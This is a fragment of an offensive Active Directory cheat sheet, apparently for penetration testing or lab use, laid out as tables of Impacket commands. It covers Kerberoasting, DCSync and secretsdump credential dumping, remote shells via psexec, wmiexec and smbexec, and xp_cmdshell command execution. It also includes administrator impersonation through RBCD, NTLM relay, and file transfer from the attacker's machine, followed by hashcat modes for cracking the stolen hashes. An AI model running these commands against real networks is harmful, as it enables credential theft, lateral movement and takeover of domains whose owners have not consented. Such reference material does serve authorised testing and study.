| Kerberoast: get all hashes | `impacket-GetUserSPNs DOMAIN/user:'pass' -dc-ip <DC> -request -outputfile spns.hash` → crack `-m 13100` |
| Kerberoast: one user (targeted) | `impacket-GetUserSPNs DOMAIN/user:'pass' -dc-ip <DC> -request-user ttimmons` |
| List all domain users | `impacket-GetADUsers -all DOMAIN/user:'pass' -dc-ip <DC>` |
| SID / RID lookup | `impacket-lookupsid DOMAIN/user:'pass'@<DC>` |
| DCSync (needs DCSync rights) | `impacket-secretsdump DOMAIN/user:'pass'@dc01.DOMAIN -dc-ip <DC> -just-dc-ntlm` |
| DCSync one user | `impacket-secretsdump DOMAIN/user:'pass'@dc01.DOMAIN -dc-ip <DC> -just-dc-user administrator` |
| Dump local hashes remotely (admin) | `impacket-secretsdump DOMAIN/admin:'pass'@<IP>` |
| Dump from saved hive files (offline) | `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL` |
| Dump from ntds.dit (offline) | `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL` |
| SYSTEM shell (admin, noisy: creates a service) | `impacket-psexec DOMAIN/admin:'pass'@<IP>` |
| Shell as the user (admin, quieter) | `impacket-wmiexec DOMAIN/admin:'pass'@<IP>` |
| Shell via SMB service | `impacket-smbexec DOMAIN/admin:'pass'@<IP>` |
| Browse SMB shares interactively | `impacket-smbclient DOMAIN/user:'pass'@<IP>` → `shares`, `use <share>`, `get <file>` |
| MSSQL login | `impacket-mssqlclient DOMAIN/user:'pass'@<IP> -windows-auth` → `enable_xp_cmdshell` → `xp_cmdshell whoami` |
| Get a Kerberos TGT | `impacket-getTGT DOMAIN/user:'pass' -dc-ip <DC>` → `export KRB5CCNAME=user.ccache` |
| RBCD: impersonate admin (after bloodyAD `add rbcd`) | `impacket-getST -spn cifs/target.DOMAIN -impersonate administrator DOMAIN/evilpc$:'Passw0rd!' -dc-ip <DC>` |
| NTLM relay | `impacket-ntlmrelayx -tf relay.txt -smb2support` |
| SMB share on your box (file transfer) | `impacket-smbserver share . -smb2support -username u -password p` → on target: `net use \\<YOUR_IP>\share /user:u p` |

## Hashcat modes you'll need

| Hash | Mode |
|---|---|
| NTLM | `1000` |
| NTLMv2 (Responder / Inveigh) | `5600` |
| Kerberoast (TGS, `$krb5tgs$23$`) | `13100` |
| AS-REP (`$krb5asrep$23$`) | `18200` |
| Cached domain creds (DCC2) | `2100` |

